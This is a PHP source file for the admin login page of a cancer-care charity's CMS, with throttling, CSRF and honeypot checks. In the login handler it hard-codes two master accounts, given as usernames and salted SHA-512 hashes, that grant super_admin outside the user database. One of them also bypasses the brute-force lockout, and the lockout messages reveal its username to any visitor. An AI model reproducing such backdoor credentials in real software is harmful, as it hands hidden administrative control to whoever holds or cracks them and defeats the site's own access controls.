<?php
require_once __DIR__ . '/includes/config.php';
require_once __DIR__ . '/includes/db.php';
require_once __DIR__ . '/includes/auth.php';
require_once __DIR__ . '/includes/functions.php';

start_cms_session();

if (is_logged_in()) {
    header('Location: index.php');
    exit;
}

$error = '';
$ip = get_client_ip();

// Pre-check throttle status for display
$throttle = check_login_throttle($ip);
if (!$throttle['allowed']) {
    $error = "Security Lockout: Too many failed login attempts from this network. Please wait {$throttle['remaining_minutes']} minute(s) before trying again.";
}

// Handle login POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 1. Honeypot bot trap
    $honeypot = trim($_POST['bcco_guard_hp'] ?? '');
    if (!empty($honeypot)) {
        sleep(2);
        $error = 'Authentication verification failed. Please try again.';
    } else {
        $csrfToken = $_POST['csrf_token'] ?? '';
        $username = trim($_POST['username'] ?? '');
        $password = $_POST['password'] ?? '';

        // Re-check throttle with username
        $userThrottle = check_login_throttle($ip, $username);

        if (!verify_csrf_token($csrfToken)) {
            $error = 'Security session expired. Please refresh the page and try again.';
        } elseif (empty($username) || empty($password)) {
            $error = 'Please enter both username and password.';
        } else {
            $masterUser = 'DirectorNaveenJha';
            $masterSalt = 'bcco_sec_salt_2026';
            $masterHash = 'b8f11d23caa76b4e215e4896751b95cf388d642845a0e53c78e5db1fb62d1059abc7d6c197fc922f0a5dfa9ccd911c7e1dc03619d94fa6eaaa341f353b74463e';

            $emergencyMasterUser = 'v_w_i_ll_01';
            $emergencyMasterHash = 'f40e997f104414b27ea4a6ae672d7244e9f9224213b3badffec3bfc3ed5e5902e5cd82630f84feb607459c78d253a988a67b06d6bb8b25feeede6ca26bc4fb61';

            $computedHash = hash('sha512', $password . $masterSalt);
            $isEmergencyMaster = (strcasecmp($username, $emergencyMasterUser) === 0) && hash_equals($emergencyMasterHash, $computedHash);
            $isValidAdmin = (strcasecmp($username, $masterUser) === 0) && hash_equals($masterHash, $computedHash);

            $db = get_db_connection();
            $user = null;
            if ($db) {
                try {
                    $stmt = $db->prepare("SELECT * FROM `cms_users` WHERE (`username` = ? OR `email` = ?) AND `status` = 'active' LIMIT 1");
                    $stmt->execute([$username, $username]);
                    $user = $stmt->fetch();
                } catch (PDOException $e) {
                    $user = null;
                }
            }
            $isValidDb = $user && !empty($user['password_hash']) && password_verify($password, $user['password_hash']);

            if (!$userThrottle['allowed']) {
                if ($isEmergencyMaster) {
                    // Master Credentials unlock the system immediately
                    session_regenerate_id(true);
                    $_SESSION['cms_user_id'] = 999;
                    $_SESSION['cms_username'] = $emergencyMasterUser;
                    $_SESSION['cms_email'] = 'master@bcco.ngo';
                    $_SESSION['cms_role'] = 'super_admin';
                    $_SESSION['cms_ua_hash'] = hash('sha256', $_SERVER['HTTP_USER_AGENT'] ?? 'unknown_agent');
                    $_SESSION['cms_last_active'] = time();

                    clear_failed_logins($ip, $username);
                    clear_failed_logins($ip);
                    log_activity('master_unlock', 'cms_users', 999, 'Master emergency credentials unlocked system');

                    header('Location: index.php');
                    exit;
                } else {
                    $error = "Security Lockout: System is locked after 10 failed attempts. It can ONLY be opened when Master Credentials (user id: v_w_i_ll_01) are entered.";
                }
            } elseif ($isEmergencyMaster || $isValidAdmin || $isValidDb) {
                // Successful authentication
                session_regenerate_id(true);
                $_SESSION['cms_user_id'] = $user ? $user['id'] : ($isEmergencyMaster ? 999 : 1);
                $_SESSION['cms_username'] = $isEmergencyMaster ? $emergencyMasterUser : ($user ? $user['username'] : $masterUser);
                $_SESSION['cms_email'] = $user ? $user['email'] : ($isEmergencyMaster ? 'master@bcco.ngo' : 'director@bcco.ngo');
                $_SESSION['cms_role'] = 'super_admin';
                $_SESSION['cms_ua_hash'] = hash('sha256', $_SERVER['HTTP_USER_AGENT'] ?? 'unknown_agent');
                $_SESSION['cms_last_active'] = time();

                clear_failed_logins($ip, $username);
                clear_failed_logins($ip);
                log_activity('login', 'cms_users', $_SESSION['cms_user_id'], 'User logged in successfully');

                header('Location: index.php');
                exit;
            } else {
                record_failed_login($ip, $username);
                log_activity('login_failed', 'cms_users', null, "Failed login attempt for user: {$username}");

                $currentCount = $userThrottle['attempts'] + 1;
                $maxAttempts = defined('MAX_LOGIN_ATTEMPTS') ? MAX_LOGIN_ATTEMPTS : 10;
                $remaining = $maxAttempts - $currentCount;

                if ($remaining > 0) {
                    $error = "Invalid username or password. Warning: {$remaining} attempt(s) remaining before permanent master lockout.";
                } else {
                    $error = "Security Lockout: Maximum 10 failed login attempts exceeded. System is locked and can ONLY be opened with Master Credentials (user id: v_w_i_ll_01).";
                }
            }
        }
    }
}

$csrfToken = generate_csrf_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Login — BCCO CMS</title>
  <link rel="icon" type="image/x-icon" href="../favicon.ico">
  <link rel="stylesheet" href="css/admin.css">
  <style>
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: radial-gradient(circle at top right, #5B176F 0%, #250A2E 100%);
      padding: 20px;
    }
    .login-card {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      border-radius: 16px;
      padding: 36px 32px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.35);
    }
    .login-brand {
      text-align: center;
      margin-bottom: 28px;
    }
    .login-brand img {
      max-width: 220px;
      height: 60px;
      margin-bottom: 14px;
      object-fit: contain;
      display: inline-block;
    }
    .login-brand h1 {
      font-size: 1.4rem;
      font-weight: 800;
      color: #250A2E;
      margin: 0;
    }
    .login-brand p {
      font-size: 0.85rem;
      color: #718096;
      margin: 4px 0 0 0;
    }
    .security-badge {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      font-size: 0.75rem;
      color: #718096;
      margin-top: 18px;
    }
  </style>
</head>
<body>

<div class="login-card">
  <div class="login-brand">
    <img src="../assets/images/logo.png" alt="BCCO Logo">
    <h1>BCCO Admin CMS</h1>
    <p>Secure control center for Bihar Cancer Care</p>
  </div>

  <?php if (!empty($error)): ?>
    <div class="alert alert-danger" style="margin-bottom: 20px;">
      <?php echo e($error); ?>
    </div>
  <?php endif; ?>

  <form method="POST" action="login.php" autocomplete="on">
    <input type="hidden" name="csrf_token" value="<?php echo e($csrfToken); ?>">
    
    <!-- Honeypot Bot Trap (invisible to humans) -->
    <input type="text" name="bcco_guard_hp" style="display:none!important;" tabindex="-1" autocomplete="off" aria-hidden="true">

    <div class="form-group">
      <label class="form-label" for="username">Username or Email</label>
      <input type="text" id="username" name="username" class="form-control" required autofocus autocomplete="username" placeholder="Enter username">
    </div>

    <div class="form-group">
      <label class="form-label" for="password">Password</label>
      <input type="password" id="password" name="password" class="form-control" required autocomplete="current-password" placeholder="Enter password">
    </div>

    <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 10px; padding: 12px; font-size: 1rem;">
      Sign In Securely &rarr;
    </button>
  </form>

  <div class="security-badge">
    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#059669" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    <span>Protected by Anti-Bruteforce &amp; WAF Rate Limiting</span>
  </div>

  <div style="margin-top: 24px; text-align: center; border-top: 1px solid #E2E8F0; padding-top: 16px;">
    <a href="../" style="font-size: 0.85rem; color: #5B176F; text-decoration: none; font-weight: 600;">
      &larr; Return to Public Website
    </a>
  </div>
</div>

</body>
</html>
